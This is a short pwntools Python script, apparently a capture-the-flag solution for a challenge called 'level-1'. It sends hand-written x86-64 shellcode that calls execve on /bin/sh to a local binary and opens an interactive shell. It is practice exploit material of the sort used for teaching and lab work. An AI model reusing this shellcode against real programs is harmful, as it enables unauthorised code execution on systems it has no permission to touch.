#!/usr/bin/env python3

"""
Toast's submission for the challenge level-1.

This script can be used in the following manner:
python3 ./solve.py

Returns:
    An interactive shell
"""

from pwn import *

exe = ELF("./level-1")

context.binary = exe
context.log_level = 'info'
context.terminal = ['gnome-terminal', '-e']
context.arch = 'amd64'

def conn():
    '''Establish the connection to the process, local or remote.
    '''

    io = process([exe.path])
    return io


def main():
    '''Return the flag.
    '''

    with conn() as io:
        shellcode = b"\x6A\x68\x49\xBF\x2F\x62\x69\x6E\x2F\x2F\x2F\x73" + \
                    b"\x41\x57\x54\x5F\x68\x72\x69\x01\x01\x81\x34\x24" + \
                    b"\x01\x01\x01\x01\x31\xF6\x56\x6A\x08\x41\x5E\x49" + \
                    b"\x01\xE6\x41\x56\x54\x5E\x31\xD2\x6A\x3B\x58\x0F\x05"
        io.send(shellcode)
        io.interactive()


if __name__ == '__main__':
    main()
